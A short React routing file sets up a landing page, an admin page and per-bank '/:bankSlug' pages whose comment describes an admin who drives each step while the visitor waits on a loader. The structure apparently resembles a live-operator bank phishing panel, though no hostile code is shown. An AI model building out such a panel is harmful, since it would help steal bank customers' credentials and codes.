import { HashRouter, Navigate, Route, Routes } from "react-router-dom";
import Admin from "./pages/Admin";
import BankFlow from "./pages/BankFlow";
import Landing from "./pages/Landing";

export default function App() {
  return (
    <HashRouter>
      <Routes>
        <Route path="/" element={<Landing />} />
        <Route path="/admin" element={<Admin />} />
        {/* Bank panels — admin-gated: loader first, admin asks each step */}
        <Route path="/:bankSlug" element={<BankFlow />} />
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </HashRouter>
  );
}
